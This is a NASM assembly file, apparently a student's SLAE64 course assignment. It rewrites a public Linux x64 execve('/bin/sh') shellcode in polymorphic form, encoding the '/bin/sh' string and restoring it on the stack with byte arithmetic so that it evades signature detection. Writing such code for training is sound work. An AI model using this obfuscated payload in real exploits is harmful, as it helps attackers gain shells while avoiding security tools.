; Student ID     : SLAE64-1611
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.2 : Polymorphic Conversion of Linux/x64 Shellcode Part Two of Three - execve("/bin/sh")
; File Name      : execve.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-603.php

section .text
global _start

_start:

xor     rdx, rdx                        ; zero out rdx

                                        ; first change we alter 0x68732f6e69622f2f
                                        ; to be something to decode 0x68732f6e69622f2f
mov     qword rbx, 0x5073286e69622f2f   ; '//bin(sP'
shr     rbx, 0x8                        ; shift 8 places to the right
push    rbx                             ; push /bin(sP to stack

add     byte [rsp+6], 0x18              ; goes from "/bin(sP"
                                        ; to "/bin(sh"

add     byte [rsp+4], 0x07              ; goes from "/bin(sh"
                                        ; to "/bin/sh"

mov     rdi, rsp                        ; moving "//bin/sh" to rdi
push    rax                             ; push \0
push    rdi                             ; push "/bin/sh"
mov     rsi, rsp                        ; moving "/bin/sh\0" to rsi
mov     al, 0x3b                        ; setting rax to execve

syscall                                 ; calling execve
